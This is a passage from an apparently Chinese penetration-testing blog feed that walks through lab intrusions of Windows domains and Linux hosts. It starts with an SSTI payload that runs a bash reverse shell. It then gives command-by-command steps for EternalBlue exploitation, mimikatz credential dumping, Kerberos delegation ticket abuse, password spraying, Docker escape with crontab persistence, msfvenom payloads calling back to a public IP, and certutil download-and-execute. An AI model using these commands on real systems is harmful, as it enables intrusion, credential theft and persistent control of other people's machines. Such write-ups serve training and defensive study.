prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果能在服务器中写文件，可写入文件，用py调用此文件执行后反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;#! /bin/bash\nbash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.83/4444 0&amp;gt;&amp;amp;1&amp;#x27;&amp;quot; &amp;gt; /tmp/shell.sh http://127.0.0.1:8787/?name=&amp;#123;&amp;#123;request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/</id>
        <title>XD22 13 补充知识</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/"/>
        <content type="html">&lt;h3 id=&#34;vpc项目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vpc项目&#34;&gt;#&lt;/a&gt; vpc 项目&lt;/h3&gt;
&lt;h4 id=&#34;vpc1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vpc1&#34;&gt;#&lt;/a&gt; vpc1&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-003.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;通过 web 漏洞拿到 web 服务器的权限，用后门工具连接后，上传 cs 的马进 行上线。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;对 web 服务器进行域内信息收集，端口扫描，mimikatz 运行，导出部分凭 据和明文。设置代理转发端口，利用 proxychains 代理流量并用 CrackMapExec 工具进行域用户和本地用户的密码喷射，得到 windows 7 的本地用户权限，通 过端口转发上线此台机器。win7 的域用户 hash 和明文进行喷射时发现没有效果。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在 windows7 上进行 spn 扫描，识别到了 mssql 服务器，利用注册表命令对 navicat 进行密码的读取并利用工具解密得到 mssql 的数据库密码。在主机上通 过 MDUT 与 proxifer 建立的规则连接到获取到密码的 mssql，开启 xpcmdshell 并 上传木马至服务器，执行成功之后获取到了 windows2008 的主机权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;对拿到的 2008 再次进行 mimikaz 导出明文，设置代理规则，用获取到的明 文依次进行域用户和本地用户登录，最终得到域控权限。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 1 ）上线 msf&lt;br&gt;
 控制 weblogic 之后，先 sleep 0 ，其次进行网卡内存活主机扫描，判断存在 445 端口开放的主机；设置 socket 转发通过 fscan 进行内网扫描，识别到 ms17_010。检测到漏洞之后，将权限转发给 msf，由 msf 进行攻击。&lt;/p&gt;
&lt;p&gt;（ 2 ）将权限从 cs 转发至 msf&lt;br&gt;
cs 配置 forigen http 的监听器，并命名为 msf&lt;br&gt;
 主机移交监听器至 msf：spawn msf&lt;/p&gt;
&lt;p&gt;（ 3 ）MSF 监听联动配置&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport xxxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 4 ）msf 添加路由&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p # 查看当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/manage/autoroute # 添加当前路由表&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 5 ）利用模块&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/bind_tcp # 正向连接上线&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhost 10.10.20.7 # 设置连接目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 10.10.20.7 # 设置扫描目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 6 ）获取 win7 的权限之后需再次设置路由&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p # 查看当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/manage/autoroute # 添加当前路由表&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 7 ）将权限从 msf 转发至 cs&lt;br&gt;
 设置 windows/beacon_bind_tcp 的监听器，生成此监听器的木马&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将木马上传到服务器，通过msf命令将木马发送到肉机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload /root/bb.exe c:\\bb.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cs连接正向执行的木马：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connect 10.10.20.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断是否在域环境及获取域控ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user /domain&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 8 ）读取明文密码和 hash&lt;br&gt;
getsystem 提升权限至 system，并运行 mimikatza 读取密码，cs 的操作为直接通过插件，msf 的操作为 load kiwi，creds_all 进行读取。&lt;/p&gt;
&lt;p&gt;（ 9 ）查找域内非约束委派用户和计算机&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置代理或者上传adfind工具来进行扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &amp;quot;DC=redteam,DC=red&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;quot; cn distinguishedName msds-allowedtodelegateto&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 10 ）对存在约束委派的 sqlserver 攻击&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;端口扫描识别存在约束委派的机器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fscan -h 10.10.10.18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击域内数据库主机：Proxifier设置整个网段的代理规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;弱口令扫描sqlserver机器：随便选去一个工具进行弱口令检测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MDUT攻击数据库：通过账户密码连接到sqlserver服务器，上传正向木马并执行（正向木马是绑定在了肉机自己的端口上，用cs连接此ip的端口可以上线）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cs连接sqlserver：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connect 10.10.10.18 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 11 ）提权并进行 mimikza 导出&lt;br&gt;
用 10.10.20.x 的 win 7 机器进行转发上线，设置监听为 10.10.10.7，进行反向连接设置，对拿到的 mssql 的机器进行权限提升并选择监听器为 10.10.10.7 上开通的监听。以管理员权限运行 mimikza 进行明文密码和 hash 的导出。&lt;/p&gt;
&lt;p&gt;（ 12 ）通过 mssql 用户以约束委派方式攻击域控主机&lt;br&gt;
建立代理或者上传 kekeo 工具进行票据操作&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;kekeo请求获取sqlserver的TGT：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgt::ask /user:sqlserver /domain:redteam.red/passwor d:Server12345 /ticket:administrator.kirbi&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用票据请求域控：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red @REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入内存：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~o wa.redteam.red@REDTEAM.RED.kirbi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 13 ）上线域控&lt;br&gt;
连接域控： &lt;code&gt;dir \\OWA\\c$&lt;/code&gt; &lt;br&gt;
 通过命令上传木马并执行上线域控，也可以用 psexec 等工具上线域控&lt;/p&gt;
&lt;h4 id=&#34;vpc2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vpc2&#34;&gt;#&lt;/a&gt; vpc2&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-004.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）web 服务器 linux 权限获取&lt;br&gt;
 web 上的 url 地址显示 login;jsessionid，抓包可以得到 remember me 的字段，&lt;br&gt;
判断出是 shiro 框架，直接用 shiro 反序列化工具攻击，通过此工具植入哥斯拉 的内存马，用哥斯拉上线此台机器。&lt;/p&gt;
&lt;p&gt;对此机器进行审查，查看到有 dockerenv 的文件，从而判断出当前正处于 d ocker 内，需要进行 docker 逃逸&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;采用 https://cloud.tencent.com/developer/article/1987725 中的挂载方法进行逃逸。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fdisk -l &amp;amp; mkdir xiaodi &amp;amp; mount /dev/vda1 xiaodi/ &amp;amp; chroot /xiaodi/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击 linux 常用 msf，准备 msf 的 elf 木马如下，生成之后将木马通过哥斯拉 上传到 docker 容器中，在从 docker 容器挂载的目录复制到/root 目录下。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;同时 msf 开启监听，等待木马执行之后的回联。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPO RT=3333 -f elf &amp;gt; shell.elf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改计划任务设置木马执行的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /xiaodi/root/shell.elf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;*/1 * * * * root /root/shell.elf&amp;#x27; &amp;gt;&amp;gt; /xiaodi/etc/crontab 等待特定时间后成功上线 linux&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）windows 2012 权限获取&lt;br&gt;
通过 msf 添加路由的方式自动添加路由，对 1 网段进行扫描，获取到存活主机 1.16 与 1.10，并且在 16 地址上存在 web 服务，通过 msf 设置代理规则将内网服务映射到服务器上，利用 proxychains 在外网上访问内网服务。构造 http://192.168.1.16/?num []=1 进行绕过，并且得到了主机凭据 {Administrator / Admin1234567}。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;批量对域用户和本地用户进行凭据测试，判断出此凭据属于 win 2012 的本地用户。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.1.10- 16 - u administrator -p &amp;#x27;Admin1234567&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;win 2012 设置有防止流量出站的防火墙规则，采用正向连接的木马绕过此限制，若不知道网络情况的话需要反向正向都进行测试，命令如下。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=5555 - f exe &amp;gt; bd.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;因win 2012 不出网，故将木马上传至linux跳板机，在跳板机上用python开启简易web服务，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m SimpleHTTPServer。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;并利用CrackMapExec直接在win 2012 上执行下载木马并且运行的木马，同时对特定端口进行正向监听，等待shell的回连。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.1.16 -u administrator -p &amp;#x27;Admin1234567&amp;#x27; -x &amp;#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.1.14:8000/bd.exe](http://192.168.1.14:8000/bd.exe) c:/bd.exe &amp;amp; c:/bd.exe&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;此时成功获取到了win 2012 的权限。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）dc 权限获取&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在win 2012 进行mimikatz kiwi的攻击从而获取到登录过此主机的历史&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;，成功获取到一个xiaodisec用户的&lt;span 